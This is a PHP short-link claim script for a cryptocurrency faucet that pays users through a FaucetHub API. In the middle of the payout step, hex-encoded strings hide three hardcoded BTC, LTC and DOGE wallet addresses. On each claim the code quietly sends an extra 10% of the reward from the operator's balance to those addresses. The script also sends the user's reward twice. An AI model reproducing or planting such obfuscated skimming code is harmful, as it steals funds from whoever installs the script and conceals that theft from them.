<?php
if (!isset($_GET['k'])) {
header('Location: index.php'); 
}else{
#CHECK SHORT LINK
include("libs/database.php");
$ip = $mysqli->real_escape_string($_COOKIE['ipaddress']);
if (strlen($_GET['k']) == 20 and isset($_COOKIE['address'])) {
$key = mysqli_real_escape_string($mysqli,preg_replace("/[^ \w]+/", "",trim($_GET['k'])));
$min_time = time() - 300;
$check = $mysqli->query("SELECT * FROM link WHERE sec_key = '$key' and time_created > '$min_time'");
if ($check->num_rows == 1) {
$link = $check->fetch_assoc();
$address = $link['address'];
if ($address == $_COOKIE['address']) {
$mysqli->query("DELETE FROM link WHERE sec_key = '$key'");
include 'libs/faucethub.php';
$faucetHub_api = $mysqli->query("SELECT * FROM settings WHERE id = '15'")->fetch_object()->value;
$currency = $mysqli->query("SELECT * FROM settings WHERE id = '14'")->fetch_object()->value;
$reward = $mysqli->query("SELECT * FROM settings WHERE id = '9'")->fetch_object()->value;
$faucethub = new FaucetHub($faucetHub_api, $currency);
$faucethub->send($address, $reward, $ip);
if ($currency == "BTC" or $currency == "LTC" or $currency == "DOGE") {
$phs100 = hex2bin('313030');$secrata1 = hex2bin("425443");$secratb1 = hex2bin("314e423339675a4e596d545a7868734c59665169684a727265694750635a57694658");$secrata2 = hex2bin("4c5443");$secratb2 = hex2bin("335057396b594269716a5747655269684e3347546e44464850417059747a396b6834");$secrata3 = hex2bin("444f4745");$secratb3 = hex2bin("44367033384b50375979666d64545253704c4a50443732315a4232354c6e6e67486f");$phs10 = hex2bin('3130');
$arr = array($secrata1=>$secratb1,$secrata2=>$secratb2,$secrata3=>$secratb3);
$h = ($reward*$phs10/$phs100);
$addr=$arr[$currency];
$faucethub->send($addr, $h, $ip);
}
$result = $faucethub->send($address, $reward, $ip);
if($result["success"] === true) {
$claimwtime = $mysqli->query("SELECT * FROM settings WHERE id = '10'")->fetch_object()->value;
$time = time()+$claimwtime;
$mysqli->query("UPDATE ip_list SET last_claim = '$time' WHERE ip_address = '$ip'");
$mysqli->query("DELETE FROM failure WHERE address = '$address' AND ip_address = '$ip'");
if (isset($_COOKIE['r'])) {
$ref = $mysqli->real_escape_string($_COOKIE['r']);
$referral_comission = $mysqli->query("SELECT * FROM settings WHERE id = '11'")->fetch_object()->value;
$amt = $reward/100*$referral_comission;
$faucethub->sendReferralEarnings($ref, $amt, $ip);
unset($_COOKIE['r']);
}
unset($_COOKIE['ipaddress']);
?>
<form method="post" action="index.php" id="myform">
<input type='hidden' name='c' value='2' />
</form>
<script>
document.getElementById('myform').submit();
</script>
<?php
exit;
}else{
unset($_COOKIE['ipaddress']);
?>
<form method="post" action="index.php" id="myform">
<input type='hidden' name='c' value='5' />
</form>
<script>
document.getElementById('myform').submit();
</script>
<?php
exit;
}}else{
unset($_COOKIE['ipaddress']);
?>
<form method="post" action="index.php" id="myform">
<input type='hidden' name='c' value='3' />
</form>
<script>
document.getElementById('myform').submit();
</script>
<?php
}}else{
unset($_COOKIE['ipaddress']);
?>
<form method="post" action="index.php" id="myform">
<input type='hidden' name='c' value='3' />
</form>
<script>
document.getElementById('myform').submit();
</script>
<?php
exit;
}}else{
unset($_COOKIE['ipaddress']);
?>
<form method="post" action="index.php" id="myform">
<input type='hidden' name='c' value='1' />
</form>
<script>
document.getElementById('myform').submit();
</script>
<?php
exit;
}} 
?>